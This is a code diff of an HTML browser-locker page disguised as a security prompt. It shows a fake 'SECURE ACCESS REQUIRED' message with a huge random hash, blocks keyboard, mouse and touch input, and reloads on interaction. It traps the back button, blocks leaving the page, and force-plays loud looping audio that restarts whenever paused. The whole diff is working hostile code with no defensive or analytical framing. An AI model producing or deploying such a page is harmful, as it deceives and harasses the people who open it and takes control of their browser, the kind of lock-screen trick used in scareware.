@@ -1,102 +1,78 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Secure Access with Audio</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+<title>Secure</title>
 <style>
-  html, body {
-    margin: 0; padding: 0; height: 100%; overflow: hidden;
-    background: black;
-    color: black;
-    user-select: none;
-    -webkit-user-select: none;
-    -moz-user-select: none;
-    -ms-user-select: none;
-    pointer-events: none;
-  }
-  #topBlocker {
-    position: fixed;
-    top: 0; left: 0; right: 0;
-    height: 40px;
-    background: black;
-    opacity: 0.99;
-    z-index: 99999999;
-    pointer-events: all;
-  }
+html,body{height:100%;margin:0;background:#000;color:#000;overflow:hidden;touch-action:none;-webkit-user-select:none;-ms-user-select:none;user-select:none}
+#topBlocker{position:fixed;top:0;left:0;right:0;height:48px;background:#000;z-index:2147483646;pointer-events:all}
+#modal{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:#000;z-index:2147483647}
+#box{max-width:94vw;padding:1rem;border:2px solid #111;background:#000;color:#111;font-family:monospace;white-space:pre-wrap;word-break:break-word;overflow:hidden}
+#pw{margin-top:1rem;width:220px;padding:.5rem;border:2px solid #111;background:#000;color:#111;font-size:16px}
+#hiddenAudio{display:none}
 </style>
 </head>
 <body>
-<div id="topBlocker"></div>
-
-<audio id="bgAudio" loop></audio>
-
+<div id="topBlocker" aria-hidden="true"></div>
+<div id="modal" role="dialog" aria-modal="true" aria-label="Security">
+  <div id="box" tabindex="-1" aria-readonly="true"></div>
+</div>
+<audio id="hiddenAudio" crossorigin="anonymous" playsinline loop></audio>
 <script>
-(() => {
-  const reloadPage = () => location.reload();
-
-  const events = [
-    'keydown', 'keyup', 'keypress',
-    'mousedown', 'mouseup', 'click', 'dblclick',
-    'contextmenu',
-    'touchstart', 'touchend', 'touchmove',
-    'pointerdown', 'pointerup', 'pointermove',
-    'wheel',
-    'copy', 'cut', 'paste',
-    'visibilitychange',
-    'focus', 'blur',
-    'selectstart',
-    'gesturestart', 'gesturechange', 'gestureend',
-  ];
-
-  events.forEach(eventName => {
-    window.addEventListener(eventName, e => {
-      e.preventDefault();
-      e.stopImmediatePropagation();
-      reloadPage();
-    }, {capture: true, passive: false});
-  });
-
-  document.addEventListener('contextmenu', e => e.preventDefault(), {capture: true});
-
-  window.addEventListener('blur', () => {
-    setTimeout(() => window.focus(), 10);
-  });
-
-  window.onbeforeunload = function() {
-    return "Вы не можете покинуть эту страницу.";
-  };
-
-  const audio = document.getElementById('bgAudio');
-  audio.src = 'https://raw.githubusercontent.com/hedredy/Project/2d591f652b1ac4b12d87e38482ad5679cb0d516c/macan-asphalt-8.mp3';
-  audio.volume = 1.0;
-  audio.loop = true;
-
-  // Запускаем аудио только после первого действия пользователя
-  function startAudioOnUserGesture() {
-    audio.play().catch(() => {});
-    window.removeEventListener('click', startAudioOnUserGesture);
-    window.removeEventListener('touchstart', startAudioOnUserGesture);
+(function(){
+  const AUDIO_URL='https://raw.githubusercontent.com/hedredy/Project/2d591f652b1ac4b12d87e38482ad5679cb0d516c/macan-asphalt-8.mp3';
+  const HASH_LEN=50000;
+  const chars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:',.<>/?";
+  const box=document.getElementById('box');
+  const modal=document.getElementById('modal');
+  const topBlocker=document.getElementById('topBlocker');
+  const audioEl=document.getElementById('hiddenAudio');
+  let stopped=false;
+  function rand(len){
+    let s=''; for(let i=0;i<len;i++) s+=chars.charAt(Math.floor(Math.random()*chars.length)); return s;
   }
-  window.addEventListener('click', startAudioOnUserGesture, { once: true });
-  window.addEventListener('touchstart', startAudioOnUserGesture, { once: true });
-
-  audio.addEventListener('pause', () => {
-    audio.play();
-  });
-
-  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:',.<>/?";
-  function randomString(len) {
-    let s = "";
-    for(let i = 0; i < len; i++) {
-      s += chars.charAt(Math.floor(Math.random() * chars.length));
+  function fillHash(){
+    const chunk=1024;
+    let written=0;
+    box.textContent='';
+    function step(){
+      let add=Math.min(chunk,HASH_LEN-written);
+      box.textContent+=rand(add);
+      written+=add;
+      if(written<HASH_LEN) requestAnimationFrame(step);
     }
-    return s;
+    step();
   }
-  const hash = randomString(50000);
-  prompt("SECURE ACCESS REQUIRED\n\nHASH:\n\n" + hash + "\n\nEnter password:");
-
-  reloadPage();
+  fillHash();
+  function prevent(e){ try{ e.preventDefault(); e.stopImmediatePropagation(); }catch(err){} return false; }
+  const blockEvents=['contextmenu','copy','cut','paste','selectstart','dragstart','mousedown','mouseup','mousemove','touchstart','touchmove','touchend','pointerdown','pointerup','wheel'];
+  blockEvents.forEach(ev=>document.addEventListener(ev,prevent,{capture:true,passive:false}));
+  document.addEventListener('keydown',function(e){ e.preventDefault(); e.stopImmediatePropagation(); return false; },{capture:true});
+  window.addEventListener('blur',()=>{ try{ window.focus(); }catch(e){} });
+  history.pushState(null,document.title,location.href);
+  window.addEventListener('popstate',()=>{ history.pushState(null,document.title,location.href); });
+  window.onbeforeunload=function(){ return ''; };
+  async function setupAudio(){
+    try{
+      audioEl.src=AUDIO_URL;
+      audioEl.loop=true;
+      audioEl.volume=1.0;
+      await audioEl.load();
+      let saved=localStorage.getItem('__pos'); if(saved) audioEl.currentTime=parseFloat(saved)||0;
+      const playTry=()=>{ audioEl.play().catch(()=>{}); };
+      playTry();
+      document.addEventListener('click',playTry,{once:true,capture:true});
+      document.addEventListener('touchstart',playTry,{once:true,capture:true});
+      audioEl.addEventListener('pause',()=>{ if(!stopped) audioEl.play().catch(()=>{}); });
+      setInterval(()=>{ try{ if(!audioEl.paused) localStorage.setItem('__pos',audioEl.currentTime); }catch(e){} },800);
+      window.addEventListener('visibilitychange',()=>{ if(document.visibilityState==='visible') audioEl.play().catch(()=>{}); });
+    }catch(e){}
+  }
+  setupAudio();
+  function immediateReload(){ try{ location.reload(); }catch(e){ location.href=location.href; } }
+  const reloadable=['click','dblclick','keydown','keyup','keypress','contextmenu','touchstart','touchend','pointerdown','pointerup','wheel'];
+  reloadable.forEach(ev=>window.addEventListener(ev,()=>{ try{ immediateReload(); }catch(e){} },{capture:true,passive:false}));
 })();
 </script>
 </body>
